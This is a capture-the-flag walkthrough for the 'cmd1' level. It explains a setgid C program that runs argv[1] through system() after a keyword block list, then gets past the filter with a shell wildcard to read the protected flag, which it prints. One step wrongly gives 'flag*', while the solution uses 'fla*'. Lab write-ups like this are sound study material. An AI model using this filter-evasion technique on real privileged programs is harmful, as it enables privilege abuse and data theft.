# 12 - cmd1

## Walkthrough
We first run `ls -la` to see which files exist in our machine:
```bash
cmd1@ubuntu:~$ ls -la
total 44
drwxr-x---   5 root cmd1      4096 Mar 21 09:49 .
drwxr-xr-x 128 root root      4096 May  3 07:30 ..
d---------   2 root root      4096 Jul 12  2015 .bash_history
-r-xr-sr-x   1 root cmd1_pwn 16056 Mar 21 09:49 cmd1
-rw-r--r--   1 root root       353 Mar 21 09:47 cmd1.c
-r--r-----   1 root cmd1_pwn    46 Apr  1 06:06 flag
dr-xr-xr-x   2 root root      4096 Jul 22  2015 .irssi
drwxr-xr-x   2 root root      4096 Oct 23  2016 .pwntools-cache
```

See first exercise for reason we can't just read `flag` directly.

We then turn to the `cmd1.c` file and its corresponding compiled binary file `cmd1`:
```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
}
int main(int argc, char* argv[], char** envp){
        putenv("PATH=/thankyouverymuch");
        if(filter(argv[1])) return 0;
        setregid(getegid(), getegid());
        system( argv[1] );
        return 0;
}
```

In order to pass the check `if(filter(argv[1])) return 0;` we need to make sure the `filter()` function returns zero (non-zero would cause `return 0`). The `filter()` function receives a `char*`, and searches it for the strings "flag", "sh" and "tmp". It does that by calling `strstr(3)`, which finds the first occurrence of a substring in a string, and returns its index if found, or 0 (NULL) otherwise. Because we need to return 0 from this function, we can't have even one `strstr(3)` call find its substring, as it would mean the result of the `strstr(3)` would be non-zero, which compared to 0 would result the number 1, which would increment the local variable `r`. To conclude, we need to provide an input via `argv[1]` which can not include any of the strings: "flag", "sh" or "tmp".

Calling `putenv(3)` adds an environment variable, `PATH`, which a value of `/thankyouverymuch`.
According to `bash(1)`:
```bash
       PATH   The search path for commands.  It is a colon-separated list of directories in which the shell looks for commands (see COMMAND EXECUTION below).  A zero-length (null) directory                   name  in  the value of PATH indicates the current directory.  A null directory name may appear as two adjacent colons, or as an initial or trailing colon.  The default path is                   system-dependent, and is set by the administrator who installs bash.  A common value is ``/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin''. 
```

It means the `main` function adds a search path to execute binaries from.

Tha `main` calls `system(3)` which executes the command we provide via `argv[1]`. We already saw that we can't provide something like `/bin/cat flag` or even `/bin/sh` because of the `filter()` function. Let's verify that indeed our `PATH` includes only the new value:
```bash
cmd1@ubuntu:~$ ./cmd1 "/bin/env"
USER=cmd1
SSH_CLIENT=109.186.22.9 52824 2222
XDG_SESSION_TYPE=tty
SHLVL=1
MOTD_SHOWN=pam
HOME=/home/cmd1
SSH_TTY=/dev/pts/0
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1025/bus
LOGNAME=cmd1
_=./cmd1
XDG_SESSION_CLASS=user
TERM=tmux-256color
XDG_SESSION_ID=33409
PATH=/thankyouverymuch
XDG_RUNTIME_DIR=/run/user/1025
LANG=en_US.UTF-8
SHELL=/bin/bash
PWD=/home/cmd1
SSH_CONNECTION=109.186.22.9 52824 163.180.160.168 2222
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
```

It means that if we try to execute a command without its relative path, it won't be found, as the only path that is searched in doesn't exist:
```bash
cmd1@ubuntu:~$ ./cmd1 "ls \$PATH"
sh: 1: ls: not found
cmd1@ubuntu:~$ ./cmd1 "/bin/ls \$PATH"
/bin/ls: cannot access '/thankyouverymuch': No such file or directory
```

We can't even create the path `/thankyouverymuch` in order to put a binary there which will run our code due to permissions:
```bash
cmd1@ubuntu:~$ mkdir /thankyouverymuch
mkdir: cannot create directory ‘/thankyouverymuch’: Permission denied
```

By running a simple `id(3)` command we can verify that `system(3)` actually runs with the privileged group permissions of `cmd1_pwn`:
```bash
cmd1@ubuntu:~$ id
uid=1025(cmd1) gid=1025(cmd1) groups=1025(cmd1)
cmd1@ubuntu:~$ ./cmd1 "/bin/id"
uid=1025(cmd1) gid=1026(cmd1_pwn) groups=1026(cmd1_pwn),1025(cmd1)
```

So we have a command we can runs using `system(3)`. There are multiple ways we can solve this, but I think the most easy one is to use `/bin/cat` but without using the string "flag", but use the feature of using a wildcard "*".

So it seems all we need to do is just:

1. Provide the command `/bin/cat flag*` as the first argument to the program (`argv[1]`)

## Solution

```bash
cmd1@ubuntu:~$ ./cmd1 "/bin/cat fla*"
PATH_environment?_Now_I_really_g3t_it,_mommy!
```